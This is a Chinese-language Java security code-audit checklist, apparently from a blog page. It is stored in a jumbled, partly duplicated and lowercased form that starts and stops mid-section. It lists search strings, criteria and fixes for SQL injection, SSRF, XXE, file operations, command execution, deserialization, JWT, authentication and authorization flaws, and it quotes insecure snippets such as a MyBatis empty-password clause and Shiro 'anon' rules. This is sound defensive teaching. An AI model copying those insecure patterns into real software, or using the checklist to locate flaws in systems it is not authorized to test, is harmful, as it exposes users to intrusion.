设置上传文件类型白名单，上传文件后重命名，重命名类型不从上传文件中获取；\n 3. 限制文件上传的大小；\n 4. 当传递参数为文件路径时，需要判断路径中是否存在../跨目录操作；\n 5. 当参数同时存在path和fileName时，分别对path、fileName和拼接结果进行判断和限制；\n 6. 限制下载、删除可操作的根文件夹。\n\n\n# 命令执行\n\n> 原理：服务器执行攻击者传入的恶意命令并执行，导致攻击者可获取服务器权限、敏感信息等。\n\n# 代码搜索范围\n\n*,*.java\n\n# 搜索字符串内容\n\nString cmd\nString command\nProcessBuilder\nRuntime\n.exec(\nnew ScriptEngineManager() // 加载JS文件\nnew Yaml();  // snakeyaml凡序列化漏洞执行命令\nnew GroovyShell(); \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 判断依据\n\n执行命令参数可控，为进行白名单或者过滤操作或不严格，未进行转义特殊字符操作或不严格。\n\n# 修复建议\n\n 1. 非必要不调用系统命令；\n 2. 调用系统命令时不使用前台传入的命令，使用id的方式选择可执行的命令；\n 3. 设置可执行命令白名单，不允许使用 && || & | ;等命令并列的特殊字符；\n 4. 控制执行命令用户权限；\n 5. 命令执行漏洞在实际工作中发现的较少。\n\n\n# 不安全的反序列化\n\n> 原理：服务器对用户可控的数据进行反序列化时，攻击者可构造恶意的反序列化对象，将有害数据传递到应用代码中。\n> \n> Java反序列化漏洞在Java安全中占据重要的地位，一些通用组件的漏洞往往是由反序列化漏洞引起的。但在实际工作中，开发人员进行反序列化操作可能性较小。\n\n# 代码搜索范围\n\n*、*.java\n\n# 搜索字符串内容\n\nreadObject(\n\n\n1\n\n\n# 判断依据\n\n 1. 反序列化数据可控，执行反序列化操作，反序列化对象readObject方法中存在危险操作。\n 2. 通常情况下是三方组件中存在漏洞，导致反序列化。因此只需要判断项目中是否引用了包含漏洞的三方组件版本即可，如果引入了则建议升级，如果无法升级，则看是否满足利用条件，并利用waf拦截相关的请求。\n\n# 修复建议\n\n 1. 设置可反序列化的类白名单，不允许名单外的类进行反序列化；\n 2. 使用安全的三方组件。\n\n\n# URL跳转\n\n> 原理：客户端用户可控跳转URL地址，攻击者在服务端发起跳转时指定恶意地址，可跳转到钓鱼或其他违法违规页面。\n\n# 搜索范围\n\n* ， *.java\n\n# 搜索字符串内容\n\nString url\nString returnUrl\nString returnPath\nString path\nsendRedirect\nforword\nredirect:\n.setHeader("refresh"\n.setStatus(302)\n.setHeader("location"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 判断依据\n\n 1. 跳转的URL地址用户可控，未经过过滤判断或过滤判断不严格；\n 2. URL跳转漏洞可配合SSRF漏洞，当SSRF不完全校验地址时，可以利用URL跳转漏洞请求跳转之后的地址。\n\n# 修复建议\n\n 1. 设置跳转地址白名单\n 2. 如果跳转地址是固定的，则可以使用id索引地址，防止用户直接传入；\n 3. 先生成跳转链接及其签名，跳转前进行签名验证。\n\n\n# 硬编码\n\n> 原理：当用户可以获取到程序源代码或者经过其他漏洞获取到程序源代码时，硬编码的密码等敏感信息可直接被用户获取。\n\n# 搜索范围\n\n* 连同前端代码一起搜索，可能搜索到前端认证用户密码、云服务id和key等信息。\n\n# 搜索字符串内容\n\npass\npwd\nkey\naccessKeyId\naccesskey\naccessid\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 判断依据\n\n代码中有明文的密码、密钥等信息（通常不包含单元测试java文件）\n\n# 修复建议\n\n 1. 加密存储到配置文件中，然后代码中读取配置文件获取密码、密钥；\n 2. 使用配置中心或者存储到数据库中。\n\n\n# 不安全的加密方式\n\n> 原理：不安全的加密方式包含使用不安全的加密算法导致攻击者对加密数据可逆，或者使用不符合要求长度的密钥进行加密操作。\n\n# 搜索范围\n\n*.java、*.properties、*.yaml\n\n# 搜索字符串内容\n\nDES\nDESUtil\nSHA1\nECB\nRSA // 看密钥长度\nMD5 // 存储数据需要加盐\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 判断依据\n\n 1. 使用不安全的加密方式加密数据；\n 2. 安全的加密方式密钥长度不符合要求\n 3. 开发人员经常在前端使用AES加密数据发送到后端，因为AES是对称加密的，前端必定存在AES密钥（JS或者请求获取）导致数据加密传输形同虚设；\n 4. 有些开发人员为了测试方便，会预留加解密接口，通常名称为decrypt和encrypt或者jiami和jiemi；\n 5. base64不是加密方式，曾经见过请求头中的认证信息是base64编码的用户名和密码串。\n\n# 修复建议\n\n 1. 使用安全的非对称加密算法\n 2. 加密算法密钥长度应该符合安全要求\n 3. 使用MD5加密存储密码信息时应当加盐（建议使用表中UUID、createDate等具有迷惑性质的随机盐）\n\n\n# 日志伪造\n\n> 原理：将未经验证的用户输入写入日志文件可致使攻击者伪造日志条目或将恶意信息内容注入日志。\n\n# 搜索范围\n\n*.java\n\n# 搜索字符串内容\n\n.info(\n.error(\n.debug(\n.warn(\n\n\n1\n2\n3\n4\n\n\n# 判断依据\n\n 1. 日志打印内容可控；\n 2. 日志内容未过滤\n\n# 修复建议\n\n 1. 日志内容固定；\n 2. 过滤打印内容，设置可打印字符白名单，不允许打印换行\\n\n\n\n# 敏感信息泄露\n\n> 原理：敏感信息泄露包含系统敏感信息泄露和用户敏感信息泄露。\n\n系统的敏感信息泄露通常由系统执行代码异常导致的，由于未设置统一的报错页面，可能直接将报错信息返回给浏览器，其中可能包含某些配置、调用栈、SQL语句、路径等。\n\n用户敏感信息泄露通常是由服务器返回较多的用户信息（密码）或者返回未脱敏的数据导致的。\n\n# 搜索范围\n\n*.java\n\n# 搜索字符串内容\n\npassword\npass\naddress\nidNo\nphoneNo\n……\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 判断依据\n\n 1. 是否存在统一报错返回；\n 2. 返回结果是否包含敏感内容。\n 3. 对于大型项目来说，返回的结果往往被封装成实体后返回，因此可以查找返回的结果封装中是否包含以上的字段，如果包含则追踪到对应的位置，查看是否进行脱敏或者清空。\n\n# 修复建议\n\n 1. 定制统一报错页面或者统一报错json返回；\n 2. 只返回必要的信息，密码等字段不应返回，敏感字段脱敏返回。\n\n\n# 安全配置错误\n\n> 原理：由于开发在配置组件时的无意识或者方便使用，导致攻击者可以未授权访问第三方组件，导致信息泄露。\n\n# 发现方式\n\n看pom文件或者lib中是否存在可能有配置错误的组件，然后查看对应的配置。\n\n常见的有可能存在问题的组件如下：Swagger 、Shiro、SpringSecurity、Druid、Spring boot actuator\n\n相对于白盒而言，这种配置错误导致的未授权问题黑盒审计更为方便。批量访问对应URL判断是否能够访问成功即可。\n\n# 修复建议\n\n 1. swagger不建议对公网开放；\n 2. 如果确实存在开放的必要，则必须进行身份认证和授权操作；\n 3. 可以配置密码密钥的组件需要配置密码和密钥，并保证密钥的复杂度。\n\n\n# XSS\n\n> 原理：攻击者利用恶意构造的JS代码使浏览器在解析时产生歧义，达到攻击者攻击用户浏览器的目的。\n\n# 发现方式\n\nXSS漏洞覆盖范围较广，服务端向外发送数据的场景都有可能产生XSS。XSS还和前端使用的框架相关，有些框架对于XSS有很好的防护性。因此白盒发现XSS较为复杂，可以看业务逻辑的位置辅助看看，发现存在可能性的位置后，配合黑盒在具体的站点上尝试是否可以成功。也可以看看是否存在过滤器，对XSS进行实体化转义或者过滤，转义或者过滤是否严谨和规范。\n\n# 修复建议\n\n 1. HTML实体化\n 2. Cookie设置httponly\n 3. 过滤特殊字符、过滤事件标签\n\n\n# 业务逻辑漏洞审计方式\n\n> 业务逻辑漏洞比较复杂，包含业务的各个方面，并且基本没有可用的搜索字符串和定位方式，往往需要通读功能点代码，理解某种功能的操作流程，发现其中的安全风险。\n\n\n# 认证相关\n\n# 注册逻辑\n\n任意用户注册\n\n任意用户注册往往由于未要求用户提供手机号、邮箱等可确定归属的身份信息、未对用户提供的身份信息进行验证或者身份信息验证的流程可绕过。从代码上的表现就是存在手机号和邮箱的验证、手机号邮箱的验证和插入用户表的操作需要一次完成或者存在前后的校验，防止越过请求直接发起插入用户数据操作。\n\n注册覆盖原用户\n\n注册覆盖原用户通常发生在注册和修改用户信息接口复用的情况下，或者用户在注册时未验证新注册的用户在当前系统中是否存在，如果重复注册用户，可能存在原用户信息泄露、权限接管等风险。代码中主要看是否校验用户名的可用性。\n\n密码明文存储\n\n在安全开发规范中要求密码需要加密存储，通常开发人员使用MD5加盐存储密码信息。代码中如果未发现加密存储行为则可能有明文密码存储的风险。另外有可能前台传过来的密码本身就是加密的，但是并不提倡这种方式，因为前台浏览器端的加密是用户实际可控的。\n\n密码盐值硬编码\n\n在密码存储时，建议使用随机盐值进行加密。使用统一的盐加密时，会降低存储密码的安全性。可用的方案是数据表中添加一列盐值字段，或者使用现有的不可变的数据库字段信息（比如：UUID、CreateTime）进行加盐，使用可修改内容加盐将导致认证失败。\n\n密码复杂度低\n\n前端验证密码复杂度，后端不验证时可绕过密码复杂度要求。需要后端进行密码复杂度的校验。\n\n# 登录逻辑\n\n任意用户登录\n\n任意用户登录指的是服务端不验证用户密码。代码上的表现为前台未传入用户密码信息，或者传入密码信息之后，未使用用户名、密码绑定查询用户信息。这种方式将导致任意用户登录。\n\n空口令登录\n\n空口令登录指的是用户在需要输入用户名密码时，传递了空字符串或者未传递该参数。在以mybaits为例，在查询数据库时如果开发采用如下的写法，将导致密码为空或者空字符串时，不带入查询。\n\n<if test="password != null and password != \'\'">\n  AND password = #{password}\n</if>\n\n\n1\n2\n3\n\n\n登录爆破\n\n在进行用户登录时未进行同一用户、同一IP、同一会话的用户登录次数限制或者未使用验证码，可导致登录爆破。解决方案可选：\n\n * 使用安全的人机交互验证方式\n * 对同一用户的多次登录尝试做阻断（封锁账号、验证绑定手机号）\n * 对同一IP多次登录失败的尝试进行封禁\n * 针对同一回话多次账户登录尝试做阻断\n * 设置风险用户名单，风险用户登录时需要多因子验证\n\n用户名枚举\n\n用户名枚举主要发生在登录时结果返回、注册前的用户名可用性查询、找回密码前的用户判断、**未授权用户信息查询（较少）**的接口返回。解决方案是登录失败或者成功、找回密码用户判断返回统一的信息。如登录失败可统一返回“用户名或密码错误。”，注册前或者找回密码的用户名判断添加验证码。针对未授权用户信息查询一般情况下不允许存在这种接口，要求鉴权或下线。\n\n登录验证不安全\n\n弱口令登录一般有几种情况：\n\n * 用户名密码在前端提示框中有placeholder的留存\n * 用户名密码前端验证\n * 用户名密码后端写死到代码中\n\n解决方案是不允许前端进行的用户验证（往往前端进行用户验证会对应后面整个系统操作的未授权或者越权），用户名密码建议存储到数据库，不允许硬编码到代码中验证，前端输入框提示中不允许提示用户名、密码信息。\n\nbase64编码传输\n\n为防止中间人攻击，在前端登录请求中需要对用户名密码（密码必须加密）信息进行加密传输，但是很多开发误认为base64是一种加密方式。解决方法是使用非对称加密的加密方式，前端使用公钥进行加密，后端使用私钥解密。根据系统所处位置和重要程度，也可以选用对称密钥加密，视情况而定。\n\n恶意账号锁定\n\n很多系统对于登录爆破有账号多次登录的封号处理机制，这种机制容易导致账号的恶意锁定，攻击者发起大量的登录请求，批量锁定大量账号。解决方法：\n\n * 登录操作添加验证码，提高攻击复杂度\n * 对于同一IP地址的多次登录尝试进行IP封禁\n * 设置账号的常用IP，非常用IP登录可验证绑定手机的验证码\n\n# 注销逻辑\n\n注销未销毁Session\n\n直接定位到session注销的接口，查看是否有session.removeAttribute("user")类似的销毁操作。经常发现开发人员为了方便，直接在该接口中跳转到了登录页面，不进行登录信息的销毁。如果是使用JWT做认证的系统，注销登录往往是前端的操作，关于JWT的安全性问题另外讨论。\n\n任意用户注销\n\n任意用户注销是因为用户发起注销请求时，传入了用户的身份信息，常见请求地址如：/user/logout?userid=10001，或者将userId信息明文设置在Cookie中，只需要修改userid就可以注销其他用户。解决方法是不传递任何userid信息，直接从请求中获取session，设置session销毁。\n\n# 密码找回逻辑\n\n任意用户密码重置\n\n任意用户密码重置往往是由于未验证用户手机号、邮箱，或者用户手机号、邮箱验证可绕过、验证码复杂度低可爆破。通常在代码中的表现是用户密码重置验证手机号验证码和重新设置密码的请求分离、前后没有关联性，导致攻击者可以跳过验证步骤，直接进行密码重置操作。对于验证码爆破，可设置三次验证错误销毁。\n\n密码找回用户名枚举\n\n密码找回位置的用户名枚举和登录位置的用户名枚举类似，在进行密码找回之前需要判断用户名是否存在。可以采用添加验证码的方式，或者使用用户绑定的手机号发送短信验证码作为密码找回的依据。\n\n# JWT安全问题\n\nJWT时效性\n\n在生成下发JWTToken信息时，可以设置JWT的有效时间，有效时间设置不建议过长。由于JWTToken生成之后无状态，通常情况下服务器不存储JWTToken信息，因此由于JWT的时效性问题导致修改用户信息后，JWT内的信息无法实时的更新，可能导致越权等的问题。解决方法是服务端将JWTToken存储到Redis中，更改信息后，将原本的Token信息从Redis中清除，放入新Token，每次请求判断用户携带的Token是否在缓存中。\n\nJWT中包含敏感信息\n\nJWT是一串有.分隔的三部分组成的字符串，其中第二部分中可以设置用户相关的信息，该部分信息使用base64编码。如果其中包含了一些敏感的个人信息（密码、手机号、身份证号、银行卡号等）很容易被他人获取。因此不要在JWT中保存过多的个人相关信息，不要在JWT中存储敏感信息。\n\nJWT未校验签名\n\n开发人员在获取JWT中的信息时通常使用的是开发人员编写的JWTUtil或者使用三方的JWT工具，在获取JWT信息时可能出现不验证JWT签名直接获取的情况。攻击者可以伪造JWT第二部分，越权操作他人账号。这种情况比较少，工作中遇到过一次，但是发现了就是大问题。\n\n弱密钥爆破\n\nJWT的密钥如果复杂度不够可能存在爆破的可能。\n\nJWT注销的解决方案\n\n常见的解决方案如下：\n\n * 前端操作直接删除Token（无为而治，但令牌仍然有效）\n * Token作为key存储到Redis中，注销删除Token\n * 在JWT中存储Token的版本信息，Redis中存储JWT版本信息和用户绑定，版本不相同则不可用（方便用户踢出下线）\n * 设置短时间的Token（时间较短可能导致频繁登录）\n * 黑名单校验，对于所有注销的Token加入黑名单，然后根据Token过期时间，过期后移出黑名单。\n\n# Cookie安全问题\n\n明文信息修改导致越权\n\n有些开发人员将用户身份信息、用户权限信息直接明文存储到Cookie中，修改Cookie中的明文信息后，然后后端从Cookie中读取信息，导致越权。不利用Cookie存储数据，所有数据均在服务端存储。\n\nXSS\n\n比较常见的Cookie安全问题，需要设置httponly，cookie.setHttpOnly(true);。\n\n不安全的反序列化\n\nShiro在Cookie中加密存储了信息，解密后反序列化。如果拿到了Shiro的密钥，则可以构造恶意的反序列化的对象。\n\n\n# 支付相关\n\n越权操作订单（增删改查）\n\n越权操作订单通常出现在订单中心位置，包括查看订单详情、下单、取消订单、删除订单、修改订单等。主要特征是服务端使用用户传入的orderId单一字段进行操作，未判断当前orderId是否属于当前用户。通常做法是获取到orderId之后，从用户信息中取userId，然后使用两个字段操作数据库。\n\n金额问题（0.01支付、负件数商品、活动优惠薅羊毛）\n\n金额问题比较复杂，如果涉及到积分、优惠、红包、满减等特殊活动，需要充分了解活动的机制、活动对象的要求。这部分和业务紧密联系，例如：积分业务和支付业务分离，当用户发起退款后，积分未退款，因此可以刷取积分等。对于0.01、负数量商品等需要看代码中总金额的计算方式是否合理，是否对商品数量做校验，总金额不要从前台传入，由后台计算获取。\n\n对于某些只能参与一次的情况，需要对关键操作加锁，防止条件竞争并发薅羊毛。\n\n\n# 权限相关\n\n未授权访问\n\n在使用某些权限控制框架时，开发人员为了开发的方便，直接设置了全部接口的允许访问（或设置了开发的接口URL允许访问），后期开发完毕之后忘记修改，导致未授权。或者在使用注解进行权限控制时，忘记给某些方法上添加注解，都可能导致未授权访问。\n\n// shiro\nmap.put("/**","anon");\n//spring security\n.anyRequest().permitAll() \n\n\n1\n2\n3\n4\n\n\n还有一种情况是开发者自己开发了拦截器，当满足某些条件（请求头包含某个字段、请求URL地址以xx开头等）不需要认证，也有可能出现未授权访问的问题。\n\n越权操作\n\n越权操作和订单越权类似，关键特征都是信任前端传入的id参数，直接利用id进行查询等操作。\n\n信任Cookie中设置的RoleName=admin，也可能导致垂直越权问题。\n\n永远不相信前台传入的数据，对于关键的数据（userId、roleId）等，由服务端获取。\n\n\n# 遗留问题\n\n# 历史遗留接口\n\n历史遗留接口包含应下线但是未下线的接口、无用功能、到期的活动等。开发在修复漏洞时可能会重新开一个新的接口，但是存在问题的接口可能仍然存在未下线。这点在移动端比较常见，或许因为兼容老版本APP，导致存在问题的接口仍然存在。这种问题的发现依赖于对于系统的了解程度和接口的管理水平。平时在审计时，多关注同文件的其他接口。\n\n# 测试（后门）对外暴露\n\n开发为了测试方便直接留存权限较大的后门。包括数据库操作、文件操作、redis操作等。还有一些接口用于生成测试数据、添加测试用户，加解密等操作。这类接口对外开放，有很大的安全隐患。接口名称多为/test/xxx或者/encrypt、/decrypt等。一般不允许有这类接口未授权对外开放。\n\n\n# 验证码类\n\n验证码的问题主要包含复杂度低、验证码重用、验证码可绕过、短信（电话）轰炸、不同业务短信验证码共用等。\n\n验证码分两类，短信（电话）验证码和人机交互验证码。总体来说应满足如下的要求：\n\n * 验证码复杂度高\n * 验证码多次尝试销毁\n * 使用过的短信（电话）验证码销毁\n * 是否有验证码不可通过前台控制\n * 图形验证码尽量复杂不可被识别\n * 图形验证码图片大小不可被前台控制\n * 短信（电话）验证码要有针对手机号、会话、IP等多种防轰炸的机制，不同业务防轰炸信息同步。\n * 不同业务的短信验证码尽量不通用\n * ……\n\n\n# 三方组件漏洞审计方式\n\n * 依靠人工查看项目中使用的依赖\n   \n   * 优点：不需要借助工具，代码审计的时候过一下依赖包，对于引入了相关依赖但未使用的情况比较准确。可以对漏洞具体的使用条件进行判断。\n   * 缺点：依赖个人经验，容易遗漏；\n\n * 通过一些第三方依赖检查功能\n   \n   * 优点：全面、速度快、更新及时\n   * 缺点：不够准确\n\n * 自己开发工具\n   \n   * 优点：顺手，可根据自己的想法改进，提升安全工具开发的能力；\n   * 缺点：重复造轮子，开发和维护的成本较高；（如果是利用第三方接口的方式，则接口更改，对应逻辑也要更改。如果是自己开发接口，则依赖组件漏洞信息的管理和收集）\n   * 思路：通过解析pom.xml文件，获取全部引入的依赖，调用接口判断是否存在漏洞。\n\n\n# 参考资料\n\n 1. 污点分析技术的原理和实践应用\n 2. JAVA代码审计之XXE与SSRF\n 3. 攻击JWT的一些方法\n 4. 浅谈Cookie和Cookie安全',normalizedContent:'好久没更新了，写一篇checklist。\n\n\n# 概述\n\n\n# 什么是代码审计？\n\n谁：代码审计值得是具有安全和开发经验的人员\n\n对象：阅读程序源代码或者经过反编译之后的代码\n\n手段：借助自动化代码分析工具或者人工阅读的方式\n\n目的：发现系统代码中存在的安全风险和设计缺陷，引导开发人员修复，保障系统运行安全。\n\n\n# 污点分析原理\n\n污点分析是一种跟踪并分析污点信息在程序中流动的技术。在漏洞分析中通常将污点分析抽象成一个三元组的表示方式<sources,sinks,sanitizers>的形式：\n\n * sources: 污点源，直接引入导致危险发生的不信任数据的位置，以sql注入为例，id=1存在sql注入，污点源为id参数；\n * sinks: 污点汇聚点，直接进行危险操作或者隐私泄露到外界的位置，以sql注入为例，污染汇聚点为executequery()相关调用执行sql语句的位置；\n * sanitizers: 无害化处理，使用转义、过滤、阻断、加密等手段不再对系统安全产生危害的位置，以sql注入为例，无害化处理指的是sql语句的过滤位置、或者sql语句产生结果的判断位置（不完全）。\n\n\n\n污点分析就是分析程序中是否存在未经过无害化处理的污染源通过传播路径到达污点汇聚点，对系统产生危害。污点分析可以分成以下的几个阶段：\n\n 1. 判断列举污点汇聚点；\n 2. 寻找到污染汇聚点对应参数的污点来源；\n 3. 判断从污点源到五点汇聚点是否存在可能的通路；\n 4. 判断是否存在无害化处理、无害化处理是否能够完全处理污点源数据的所有情况。\n\n污点分析是信息流分析技术中的一种实践的技术，广泛应用于静态分析安全测试中，是对人工代码审计的一种抽象。几乎所有的漏洞都可以按照污点分析的方式发现，但是分析的复杂度并不相同。对于sql等常见的漏洞，污点汇聚点（危险函数）单一且容易发现，相对来说分析起来比较容易；但是对于逻辑漏洞、信息泄露、xss等漏洞覆盖范围广、产生情况复杂、没有准确的危险函数，白盒发现较为困难且准确度不高。\n\n\n# 代码审计流程\n\n早期的代码审计由于目标系统规模小、代码量较少、代码之间的逻辑调用关系简单清晰，使用人工审计的方式就可以覆盖整个系统了。人工代码审计通常有三种思路：\n\n * 全文通读了解代码每部分的功能以及数据流向，结合具体的功能点发现代码中存在的问题。这种方式全面但是耗时耗力；\n * 危险函数定位法，通过定位上面提到的sinks，找到危险函数之后向上排查，看危险函数数据来源，是否存在无害化处理，这种方式快捷方便，但不全面，对逻辑漏洞没有发现的能力；\n * 对具体的功能点进行建模和审计，根据需求文档或者单一的功能点，分析可能出现的风险项，逐条排查。速度较快，对逻辑漏洞也能很好的把握。排查效果取决于安全人员的威胁建模能力和对目标的了解程度。\n\n由于目标项目在发展的过程中逐渐复杂化以及代码量的指数级增长，系统和系统之间调用关系复杂，人工审计的方式已经无法做到全面的审计。一些对应的工具介入，极大的提高了代码审计人员的工作效率。静态代码审计工具原理发展如下：\n\n * 关键字的匹配\n * 基于ast代码分析\n * 基于ir/cfg的代码分析\n * ql概念\n\n\n# 常用工具\n\n * 用的顺手的编辑器\n   * idea、vscode、eclipse等\n * 反编译工具\n   * jd-gui、jadx、wja(有动态调试的功能)等\n * 自动化代码审计工具\n   * checkmarx、seay、fortify sca、找八哥、codesec等\n * 其他\n   * codeql、soot、dependencycheck、ysoserial、jndi-injection-exploit等\n\n\n# 基础漏洞审计方式\n\n\n# sql注入\n\n> 原理：攻击者在可利用的位置插入恶意的sql语句，使原本的sql语句产生歧义，从而达到攻击者操纵数据库的目的。\n\n# 代码搜索范围\n\n*、*mapper.xml、*.java、*.xml(少部分开发人员mapper文件编写不规范)\n\n# 搜索字符串内容\n\nstring sql = "\n@select\n@update\n@delete\n@insert\n"select\n"update\n"insert\n"delete\n${sql}\n${\n.executequery(\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 判断依据\n\n 1. 原生jdbc是否存在直接拼接sql语句（使用+，或者使用stringbuilder append()），未经过预编译；\n 2. mybatis使用${}；\n 3. hibernate、jpa默认是经过预编译的，但是如果开发自己编写的sql语句，也需要进行检查；\n 4. java是强类型语言，当注入参数为long、int等数字类型时无法进行注入；\n 5. 找到危险函数位置之后，向上搜索，找函数、方法调用位置，直到请求入口（controller层），判断是否存在无害化处理、无害化处理是否严格；\n 6. 注意开发可能设置全局过滤。\n\n# 修复方式\n\n 1. 参数固定为数字类型时，使用数字类型接收，或者转为数字类型；\n 2. 预编译，原生jdbc使用?参数占位，之后使用.preparedstatement，mybatis使用#{}替换${}；\n 3. 对于mybatis中无法使用#{}的场景：\n    * like：使用concat(\'%\',#{},\'%\')\n    * in：使用<foreach\n    * order by：代码上做白名单\n 4. 设置过滤器，严格限制传入参数\n\n\n# ssrf\n\n> 原理：ssrf(server-side request forge, 服务端请求伪造)，攻击者利用漏洞让服务端发起指定的请求。ssrf攻击的目标一般是从外网无法访问的内网系统。\n> \n> java中的ssrf支持的协议：http、https、file、ftp、mailto、jar、net、doc。在java中ssrf的利用局限较大，一般利用http协议来探测端口，利用file协议读取任意文件。\n\n# 代码搜索范围\n\n*、*.java\n\n# 搜索字符串内容\n\nnew url(\nurlconnection\nrequest.*.execute\nimageio.read(\nhttpclient\nclienthttprequest\nresttemplate\n.postforobject\n.getforobject\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 判断依据\n\n 1. 该漏洞经常出现在客户端传入文件、图片的url地址（通常存储在nas、oss上）通过url获取相关的文件或者当前请求需要访问其他请求，请求地址由客户端传入；\n 2. 主要看参数是否可控，是否存在过滤，协议、端口等的限制措施、相关的限制措施是否完善；\n 3. 通常情况下，项目会封装一个用于发起请求的方法，除上述关键字还需要找该方法全部调用位置。\n\n# 修复方式\n\n 1. 当目标请求为域名时，获取域名所对应的ip地址，防止内部解析绕过；\n 2. 设置内网地址黑名单或白名单；\n 3. 设置协议白名单；\n 4. 检查对应的ip地址是否为黑名单地址；\n 5. 禁止302跳转，或者存在302跳转时递归获取跳转的url，判断是否为黑名单地址；\n 6. 禁止其他非必要的协议。\n\n\n# xxe\n\n> 原理：服务器接收来自攻击者恶意构造的xml数据，在解析xml数据时，没有严格的安全控制措施，导致xml外部实体注入。造成任意文件读取、执行命令、信息泄露等后果。\n\njava在解析xml时通常有四种方式：dom、sax、dom4j、jdom。\n\n//1. documentbuilder 原生、可回显\nimport javax.xml.parsers.documentbuilderfactory;\ndocumentbuilderfactory dbf = documentbuilderfactory.newinstance();\ndocumentbuilder db = dbf.newdocumentbuilder();\nstringreader sr = new stringreader(xml_con);\ninputsource is = new inputsource(sr);\ndocument document = db.parse(is); \n\n//2. saxreader 第三方库\nimport org.dom4j.io.saxreader;\nsaxreader saxreader = new saxreader();\ndocument document = saxreader.read(request.getinputstream());\n\n//3. saxbuilder 第三方库\nimport org.jdom2.input.saxbuilder;\nsaxbuilder builder = new saxbuilder();  \ndocument document = builder.build(request.getinputstream());\n\n//4. saxparserfactory 原生、不可回显\nimport javax.xml.parsers.saxparserfactory;\nsaxparserfactory factory  = saxparserfactory.newinstance(); \nsaxparser saxparser = factory.newsaxparser();\nsaxhandler handler = new saxhandler();  \nsaxparser.parse(request.getinputstream(), handler);\n\n// 其他方式\nimport org.xml.sax.helpers.xmlreaderfactory;\nxmlreader xmlreader = xmlreaderfactory.createxmlreader();\nxmlreader.parse( new inputsource(new stringreader(xml_con)) );\n\nimport org.apache.commons.digester3.digester;\ndigester digester = new digester();\ndigester.parse(new stringreader(xml_con)); \n\nimport javax.xml.parsers.documentbuilderfactory;\ndocumentbuilderfactory dbf = documentbuilderfactory.newinstance();\ndbf.setxincludeaware(true);   // 支持xinclude\ndbf.setnamespaceaware(true);  // 支持xinclude\ndocumentbuilder db = dbf.newdocumentbuilder();\nstringreader sr = new stringreader(xml_con);\ninputsource is = new inputsource(sr);\ndocument document = db.parse(is);  // parse xml\n\nsaxparserfactory spf = saxparserfactory.newinstance();\nsaxparser saxparser = spf.newsaxparser();\nxmlreader xmlreader = saxparser.getxmlreader();\nxmlreader.parse( new inputsource(new stringreader(xml_con)) );\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n# 代码搜索范围\n\n*、*.java\n\n\n# 搜索字符串内容\n\nxml\nxmlreader\nsaxparser\nsaxbuilder\ndocumentbuilder\ndocument.parse(\n\n\n1\n2\n3\n4\n5\n6\n\n\nxml解析常见的包：\n\njavax.xml.parsers.documentbuilderfactory;\njavax.xml.parsers.saxparser\njavax.xml.transform.transformerfactory\njavax.xml.validation.validator\njavax.xml.validation.schemafactory\njavax.xml.transform.sax.saxtransformerfactory\njavax.xml.transform.sax.saxsource\norg.xml.sax.xmlreader\norg.xml.sax.helpers.xmlreaderfactory\norg.dom4j.io.saxreader\norg.jdom.input.saxbuilder\norg.jdom2.input.saxbuilder\njavax.xml.bind.unmarshaller\njavax.xml.xpath.xpathexpression\njavax.xml.stream.xmlstreamreader\norg.apache.commons.digester3.digester\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 判断依据\n\n 1. 解析器解析的xml需要外部可控；\n 2. 未禁用dtd或者允许外部实体；\n 3. 大多数项目都会封装一个用于解析xml的方法，因此除上述关键字以外，还需要寻找对应方法的调用位置逐个判断。\n\n# 修复方式\n\nxxe修复方式相对简单，禁用dtds或者禁止使用外部实体即可。\n\ndbf.setfeature("http://apache.org/xml/features/disallow-doctype-decl", true); //禁用dtds (doctypes),几乎可以防御所有xml实体攻击\n//如果不能禁用dtds,可以使用下两项，必须两项同时存在\ndbf.setfeature("http://xml.org/sax/features/external-general-entities", false);      //防止外部普通实体poc 攻击\ndbf.setfeature("http://xml.org/sax/features/external-parameter-entities", false);   //防止外部参数实体poc攻击\n\n\n1\n2\n3\n4\n\n\n\n# 任意文件操作\n\n> 原理：任意文件操作包含任意文件下载、删除、上传、目录（文件）遍历、解压缩等。攻击者可以利用上述漏洞恶意操作服务器文件。\n\n# 代码搜索范围\n\n*、*.java\n\n# 搜索字符串内容\n\nnew file(\nstring path\nstring filename\nnew fileinputstream(\nnew fileoutputstream(\nnew filereader\nresponse.setcontenttype("application/octet-stream; charset=utf-8");\nfile.delete();\nfileutils.\nnew zipentity(\nfile.getname(\n.unzip(\n.mkdirs(\nstream.write(\nsave2file(\nfos、fis.close()\npublic class ziputil\nmultipartfile(\nfile.getoriginalfilename(\nupload\ndownload\n上传 // 搜注释\n下载 // 搜注释\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# 判断依据\n\n 1. 未对文件路径、文件名称、文件类型做合理限制，上传文件路径或者文件名称可存在../目录跨越的操作；\n 2. 在解压缩文件时未对压缩包中的文件类型进行限制；\n 3. 未限制上传文件大小；\n 4. 通常情况下在解压缩文件时，开发一般都会创建一个临时目录，解压完成之后将临时文件夹删除，如果临时文件夹名称可以控制，则可以达到任意文件删除的目的；\n 5. 判断文件类型的操作时，开发一般先获取到文件名称，然后使用filename.substring(filename.lastindexof("."));获取文件后缀名，如果此处使用filename.indexof(".")则可能存在绕过可能。\n\n# 修复建议\n\n 1. 判断上传数据包的content-type\n 2. 设置上传文件类型白名单，上传文件后重命名，重命名类型不从上传文件中获取；\n 3. 限制文件上传的大小；\n 4. 当传递参数为文件路径时，需要判断路径中是否存在../跨目录操作；\n 5. 当参数同时存在path和filename时，分别对path、filename和拼接结果进行判断和限制；\n 6. 限制下载、删除可操作的根文件夹。\n\n\n# 命令执行\n\n> 